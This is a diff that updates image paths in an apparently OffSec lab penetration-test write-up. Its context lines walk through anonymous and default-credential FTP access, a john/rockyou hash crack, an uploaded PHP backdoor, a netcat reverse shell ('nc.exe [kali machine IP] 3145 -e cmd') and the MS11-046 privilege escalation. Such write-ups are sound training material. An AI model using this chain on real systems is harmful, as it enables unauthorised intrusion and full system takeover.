@@ -139,35 +139,35 @@ Enumerated top 200 UDP ports:
 
 #### -Logged in to FTP as anonymous and found user admin listed in "accounts":
 
-![](Pasted%20image%2020221001114759.png)
+![](Images/Pasted%20image%2020221001114759.png)
 
 #### -Attempted to login via FTP as username "admin" and password "admin" and found the following files and then downloaded them to my kali machine:
 
-![](Pasted%20image%2020221001114845.png)
+![](Images/Pasted%20image%2020221001114845.png)
 
 #### -Cat'd ".htpasswd" file and found the following "offsec" user and the hashed password:
 
-![](Pasted%20image%2020221001114935.png)
+![](Images/Pasted%20image%2020221001114935.png)
 
 #### - Cat'd ".htaccess" and found:
 
-![](Pasted%20image%2020221001115013.png)
+![](Images/Pasted%20image%2020221001115013.png)
 
 #### -Googled "what is a .htaccess file" and found it is located in a root directory:
 
-![](Pasted%20image%2020221001115038.png)
+![](Images/Pasted%20image%2020221001115038.png)
 
 #### -Typed "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" to crack the hash and password "elite" was received:
 
-![](Pasted%20image%2020221001115111.png)
+![](Images/Pasted%20image%2020221001115111.png)
 
 ## Port 242
 
 #### -Navigated to "http://192.168.100.46:242" and required a login. Input the found user "offsec" and password "elite" andwas able to login showing the following webpage:
 
-![](Pasted%20image%2020221001115137.png)
+![](Images/Pasted%20image%2020221001115137.png)
 
-![](Pasted%20image%2020221001115213.png)
+![](Images/Pasted%20image%2020221001115213.png)
 
 
 ---
@@ -185,7 +185,7 @@ Enumerated top 200 UDP ports:
 
 #### -Uploaded "simplephpbackdoor.php" 
 
-![](Pasted%20image%2020221001115235.png)
+![](Images/Pasted%20image%2020221001115235.png)
 
 ## Port 242
 
@@ -193,13 +193,13 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir" and found we had remote code execution:
 
-![](Pasted%20image%2020221001115307.png)
+![](Images/Pasted%20image%2020221001115307.png)
 
 #simplephpbackdoorRCE
 
 #### -Typed "locate nc.exe" on kali machine and typed "cp /usr/share/windows-resources/binaries/nc.exe ." to copy the nc.exe binary into kali machine home directory:
 
-![](Pasted%20image%2020221001115341.png)
+![](Images/Pasted%20image%2020221001115341.png)
 
 #### -Typed "ftp 192.168.69.46" and logged in with user admin and password admin
 
@@ -210,7 +210,7 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=nc.exe [kali machine IP] 3145 -e cmd" and received a command prompt:
 
-![](Pasted%20image%2020221001115406.png)
+![](Images/Pasted%20image%2020221001115406.png)
 
 
 ---
@@ -259,15 +259,15 @@ Network Card(s):           N/A
 
 #### -Googled "6.0.6001 Service Pack 1 Build 6001 exploit"  and found the following webpage with exploit MS11-046:
 
-![](Pasted%20image%2020221001115431.png)
+![](Images/Pasted%20image%2020221001115431.png)
 
-![](Pasted%20image%2020221001115452.png)
+![](Images/Pasted%20image%2020221001115452.png)
 
 #### -As the exploit show above was not already precompiled I navigated to "https://github.com/SecWiki/windows-kernel-exploits" as the webpage had a precompiled MS11-046 exploit:
 
-![](Pasted%20image%2020221001115515.png)
+![](Images/Pasted%20image%2020221001115515.png)
 
-![](Pasted%20image%2020221001115534.png)
+![](Images/Pasted%20image%2020221001115534.png)
 
 #### -Downloaded the complied MS11-046 exploit to my kali machine
 
@@ -279,5 +279,5 @@ Network Card(s):           N/A
 
 #### -Typed "ms11-046.exe" and received a command prompt running as nt authority\system:
 
-![](Pasted%20image%2020221001115612.png)
+![](Images/Pasted%20image%2020221001115612.png)
 ![](../Images/Pasted%20image%2020220622221842.png)
